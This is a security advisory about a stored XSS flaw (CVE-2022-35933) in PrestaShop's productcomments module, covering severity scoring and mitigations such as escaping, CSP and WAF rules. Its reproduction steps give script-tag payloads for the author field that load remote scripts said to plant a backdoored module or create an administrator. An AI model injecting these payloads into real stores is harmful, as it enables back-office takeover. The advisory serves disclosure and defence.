---
layout: post
title: "CWE-79 Danger of stored XSS vulnerability in CMS especially for PrestaShop"
categories: modules
author:
- 202 ecommerce
- TouchWeb.fr
- Friends-Of-Presta.org
meta: "CVE,PrestaShop"
severity: "critical (9.6)"
---

As a developer, the severity level is often considered to be low. By underestimating the gravity, we lower our guard against these vulnerabilities. However, some types of vulnerabilities called "stored XSS" are particularly critical when they spread from the front office to the back office.

## Summary

* **Published at**: 2023-02-07
* **Vendor**: All CMS. 
* **Weakness**: [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
* **Severity**: critical (9.6)

Vulnerability by design applied on PrestaShop qualified on productcomments module suffering of [CVE-2022-35933](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35933)

## Description

This publication is a summary of Touchweb's work studying the impact of XSS vulnerabilities in the context of the PrestaShop CMS. 

To highlight the criticality of XSS and give us the means to mitigate their effects, Touch Web conducted its research based on the vulnerability of the [productcomments module](https://github.com/PrestaShop/productcomments/security/advisories/GHSA-prrh-qvhf-x788), which in version 5.0.1 has a stored XSS.

## CVSS base metrics

* **Attack vector**: network
* **Attack complexity**: low
* **Privilege required**: none
* **User interaction**: required
* **Scope**: changed
* **Confidentiality**: high
* **Integrity**: high
* **Availability**: high

**Vector string**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H

### How to know if a XSS is critical ?

That's important to caracterize with strictness XSS. There is to many people which only tag this vulnerability as "XSS" which is dangerous since there will be misunderstood and often under valuation of gravity.

The most dangerous are XSS of type 2 according to their official CWE ([CWE-79](https://cwe.mitre.org/data/definitions/79.html)), meaning Stored-XSS (or persistent XSS) and more specialy those which can be injected from FRONT by guest or assimilated to target BACK.

We will call them: [CWE-79](https://cwe.mitre.org/data/definitions/79.html) / T2-F2B (Type 2 : Stored XSS AND from Front office to Back office).

In summary, if you can inject a XSS from FRONT as guest (or assimilated), which will be stored in database then interprated on BACK, then it's a critical vulnerability which must be scored CVSS 3 : 9.5+/10 since it unlocks design's vulnerabilities (users's administration / modules's administration / any admin's controllers)

For all others XSS including Type 0/1 and Type 2 F2F/B2B/B2F, you can preserve a low to medium gravity score specificaly on Prestashop. Nevertheless, be warn that on other solutions, XSS of type 1 can be critical (like Wordpress which suffer of a predictible backoffice's link).

### Module presentation

The productcomments module allows, as an anonymous or customer, to post comments associated with products from the front office of the store. Three fields are present:
* title
* Author
* Content

The author field, after a refactoring, is not protected in the sense that the entered value is stored as is in the database and displayed without escaping in the back office.

Example:
* author entered: <em>my name</em>
* result: my name will be displayed in bold in the back office in the moderation table of comments.

From then on, it is possible to inject malicious JavaScript, for example: `<script src='test.js'>`


### Proof of concept

Touchweb provides two benign JavaScript scripts that highlight the vulnerability for PrestaShop 1.7+ (we tested for 1.7.7.8).
* Script A allows injecting a blockwishlist module containing a backdoor without the knowledge of a moderator, i.e. an administrator with rights.
* Script B allows injecting an administrator in the specific case where it is disabled.

**DO NOT TEST IT IN PRODUCTION.**


### How to reproduce?

* We installed PrestaShop 1.7.7.8.
* We installed the [productcomments module zip](https://github.com/PrestaShop/productcomments/releases/download/v5.0.1/productcomments.zip).
* (Optional) To facilitate adding comments without a customer account, we activated the anonymous comments option.
* Enter `<script src="//1j.vc/ps_a.js">` or `<script src="//1j.vc/ps_b.js">` as "author" and complete the other fields.
* Return to the back office on the module configuration page.


### How to best protect yourself?

In the face of a Stored XSS vulnerability targeting the back office, it is impossible to undo all the effects. However, the most dangerous exploits can be limited.

* Systematically escape characters ' " < and > by replacing them with HTML entities and applying strip_tags - Smarty and Twig provide auto-escape filters : 
> Smarty: `{$value.comment|escape:'html':'UTF-8'}`  Twig: `{\{value.comment|e\}}`(without backslashes)
> * Limit to the strict minimum the length's value in database - a database field which allow 10 characters (`varchar(10)`) is far less dangerous than a field which allow 40+ characters (use cases which can exploit fragmented XSS payloads are very rare)
* Configure CSP headers (content security policies) by listing  externals domains allowed to load assets (such as js files).
* If applicable: check against all your frontoffice's uploaders, uploading files which will be served by your server with mime type application/javascript (like every .js natively) must be strictly forbidden as it must be considered as dangerous as PHP files.
* Activate OWASP 941's rules on your WAF (Web application firewall) - be warn that you will probably break your backoffice and you will need to preconfigure some bypasses against these set of rules.


### How to know if I'm already infected by a XSS of type 2 (Stored-XSS)?

You must check every tables within your database which could store guest's input, at least against common XSS injection. 
You can find a list of potential hijacked events on [PrestaShop method Validate::isCleanHtml()](https://github.com/PrestaShop/PrestaShop/blob/develop/classes/Validate.php#L507)

Be warn that you will probably face falses positives alerts which can be time consumming.


### How CMS's core team can help ecosystem about CSP headers ?

If you already setup CSP headers, you already know that it's a plague on our E-Commerce ecosystem with tens externals dependancies (cariers / banks / tracking / remarketing / ...), to setup and more over to maintain over time.

This chaos generate front/back breaks on updates which make it stressfull for all professionnals trying to strength their protection against XSS.

It would be very appreciated if core team constrains plugins developpers to list with strictness their externals dependancies in a normative way which permit a professional generation of CSP headers - not based on chaotic front/back exploration.
